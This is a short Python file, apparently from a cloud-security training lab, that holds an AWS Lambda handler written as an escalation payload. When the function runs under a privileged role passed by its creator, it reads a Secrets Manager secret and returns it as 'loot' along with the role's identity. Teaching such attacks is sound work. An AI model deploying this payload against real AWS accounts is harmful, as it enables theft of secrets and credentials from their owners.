# Lab 1.2 - the Kraken's Lambda payload.
# Runs with whatever execution role the creator passed. If that role is privileged,
# so is this code. That's the whole heist.
import json
import boto3


def handler(event, context):
    sm = boto3.client("secretsmanager")
    secret_id = event.get("secret_id", "skyfortress/heist/launch-codes")
    try:
        value = sm.get_secret_value(SecretId=secret_id)["SecretString"]
        who = boto3.client("sts").get_caller_identity()["Arn"]
        return {"ran_as": who, "loot": json.loads(value)}
    except Exception as exc:  # noqa: BLE001 - lab code, show the error to the student
        return {"error": str(exc)}
